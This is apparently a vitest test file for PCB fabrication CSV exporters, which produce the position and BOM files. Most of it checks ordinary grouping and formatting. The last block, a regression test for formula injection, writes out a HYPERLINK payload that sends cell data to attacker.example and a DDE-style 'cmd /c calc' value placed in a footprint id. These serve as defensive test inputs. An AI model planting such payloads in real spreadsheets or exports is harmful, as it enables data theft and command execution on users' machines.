import { describe, expect, it } from "vitest";
import {
  buildBomCsv,
  buildPositionsCsv,
  type FabComponentsDoc,
  type FabFootprint,
} from "../src/logic/fab";

function fp(over: Partial<FabFootprint>): FabFootprint {
  return {
    ref: "R1",
    fpid: "Resistor_SMD:R_0603_1608Metric",
    side: "top",
    posMm: { x: 10, y: 20 },
    rotationDeg: 0,
    smd: true,
    excludeFromPos: false,
    excludeFromBom: false,
    dnp: false,
    fields: { Value: "10k" },
    ...over,
  };
}

function doc(footprints: FabFootprint[], aux = { x: 0, y: 0 }): FabComponentsDoc {
  return {
    board: {
      widthMm: 50,
      heightMm: 40,
      bboxOriginMm: { x: 0, y: 0 },
      auxOriginMm: aux,
      copperLayers: 2,
      thicknessMm: 1.6,
    },
    footprints,
  };
}

/** Minimal quoted-cell-aware CSV parser (grouped designators carry commas). */
function parseRow(line: string): string[] {
  const cells: string[] = [];
  let cell = "";
  let quoted = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i]!;
    if (quoted) {
      if (ch === '"' && line[i + 1] === '"') {
        cell += '"';
        i++;
      } else if (ch === '"') quoted = false;
      else cell += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ",") {
      cells.push(cell);
      cell = "";
    } else cell += ch;
  }
  cells.push(cell);
  return cells;
}

function rows(csv: string): string[][] {
  return csv.replace(/^﻿/, "").trim().split("\r\n").map(parseRow);
}

describe("buildPositionsCsv", () => {
  it("emits aux-relative mm with negated Y (plugin parity)", () => {
    const csv = buildPositionsCsv(
      doc([fp({ posMm: { x: 15, y: 25 } })], { x: 5, y: 5 }),
    );
    const [header, row] = rows(csv);
    expect(header).toEqual([
      "pos_x",
      "pos_y",
      "rotation",
      "side",
      "designator",
      "mpn",
      "pack",
      "footprint",
      "value",
      "mount_type",
    ]);
    expect(row!.slice(0, 5)).toEqual(["10", "-20", "0", "top", "R1"]);
    expect(row![7]).toBe("R_0603_1608Metric");
    expect(row![9]).toBe("smt");
  });

  it("skips exclude-from-pos and ** designators; tht for non-smd", () => {
    const csv = buildPositionsCsv(
      doc([
        fp({ ref: "R1" }),
        fp({ ref: "R2", excludeFromPos: true }),
        fp({ ref: "REF**", fields: { Value: "x" } }),
        fp({ ref: "J1", smd: false }),
      ]),
    );
    const body = rows(csv).slice(1);
    expect(body.map((r) => r[4])).toEqual(["R1", "J1"]);
    expect(body[1]![9]).toBe("tht");
  });

  it("resolves MPN/package field aliases in the plugin's order", () => {
    const csv = buildPositionsCsv(
      doc([
        fp({
          fields: {
            Value: "10k",
            "Part Number": "PN-2",
            MPN: "MPN-1",
            case: "0603",
          },
        }),
      ]),
    );
    const row = rows(csv)[1]!;
    expect(row[5]).toBe("MPN-1"); // MPN beats "Part Number"
    expect(row[6]).toBe("0603");
  });
});

describe("buildBomCsv", () => {
  it("groups by value+footprint+package+MPN and counts", () => {
    const csv = buildBomCsv(
      doc([fp({ ref: "R1" }), fp({ ref: "R2" }), fp({ ref: "R3", fields: { Value: "1k" } })]),
    );
    const body = rows(csv).slice(1);
    expect(body).toHaveLength(2);
    expect(body[0]![0]).toBe("R1,R2");
    expect(body[0]![1]).toBe("2");
    expect(body[1]![0]).toBe("R3");
  });

  it("never groups DNP parts and marks them Yes", () => {
    const csv = buildBomCsv(doc([fp({ ref: "R1", dnp: true }), fp({ ref: "R2", dnp: true })]));
    const body = rows(csv).slice(1);
    expect(body).toHaveLength(2);
    expect(body[0]![6]).toBe("Yes");
  });

  it("detects DNP from Value and from a dnp-named field", () => {
    const csv = buildBomCsv(
      doc([
        fp({ ref: "R1", fields: { Value: "DNP" } }),
        fp({ ref: "R2", fields: { Value: "1k", DnP: "yes" } }),
      ]),
    );
    const body = rows(csv).slice(1);
    expect(body.every((r) => r[6] === "Yes")).toBe(true);
  });

  it("adds non-empty custom fields as extra columns with conflict cells", () => {
    const csv = buildBomCsv(
      doc([
        fp({ ref: "R1", fields: { Value: "10k", Tolerance: "1%" } }),
        fp({ ref: "R2", fields: { Value: "10k", Tolerance: "1%" } }),
        fp({ ref: "R3", fields: { Value: "10k", Tolerance: "5%" } }),
      ]),
    );
    const [header, row] = rows(csv);
    expect(header).toContain("Tolerance");
    const idx = header!.indexOf("Tolerance");
    // All three share a group; the conflicting tolerance renders ref-tagged.
    expect(row![0]).toBe("R1,R2,R3");
    expect(row![idx]).toContain("[R1,R2]1%");
    expect(row![idx]).toContain("[R3]5%");
  });

  it("skips exclude-from-bom parts", () => {
    const csv = buildBomCsv(doc([fp({ ref: "R1" }), fp({ ref: "MH1", excludeFromBom: true })]));
    expect(rows(csv).slice(1)).toHaveLength(1);
  });
});

// repro for W-3 (findings group W / security audit v3 #27, also v2): cells
// beginning with a spreadsheet formula metacharacter are evaluated by
// Excel/LibreOffice on open. Values come from board fields any board writer
// controls; custom field NAMES become header cells too.
describe("W-3 CSV formula injection", () => {
  const FORMULA = '=HYPERLINK("http://attacker.example/?s="&A1)';
  const FORMULA_LEAD = /^[=+\-@\t\r]/;
  const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;
  const cellsOf = (csvText: string): string[] =>
    csvText
      .replace(/^﻿/, "")
      .split("\r\n")
      .filter((l) => l.length > 0)
      .flatMap(parseRow);

  it("neutralises formula-leading BOM values and custom-field header names", () => {
    const out = buildBomCsv(
      doc([
        fp({ ref: "R1", fields: { Value: FORMULA, "+cmd": "-1", "@tab": "\tX" } }),
        fp({ ref: "R2", fields: { Value: "+10k" } }),
      ]),
    );
    for (const c of cellsOf(out)) {
      if (PLAIN_NUMBER.test(c)) continue; // numeric cells stay numeric by design
      expect(c, `cell ${JSON.stringify(c)} starts with a formula metacharacter`).not.toMatch(
        FORMULA_LEAD,
      );
    }
    // The payload must still be present (prefixed), not silently dropped.
    expect(out).toContain(`'${FORMULA.replaceAll('"', '""')}`);
  });

  it("neutralises formula-leading positions cells (footprint name / designator)", () => {
    const out = buildPositionsCsv(
      doc([fp({ ref: "=R1", fpid: "Lib:-cmd|'/c calc'!A0" })]),
    );
    for (const c of cellsOf(out)) {
      if (PLAIN_NUMBER.test(c)) continue;
      expect(c).not.toMatch(FORMULA_LEAD);
    }
  });

  it("does not touch ordinary numeric cells (negative coordinates stay numeric)", () => {
    const out = buildPositionsCsv(doc([fp({ posMm: { x: -1.5, y: 2 } })], { x: 0, y: 0 }));
    // pos_x is -1.5; a numeric cell must not get the apostrophe prefix.
    expect(out).toContain("-1.5");
    expect(out).not.toContain("'-1.5");
  });
});
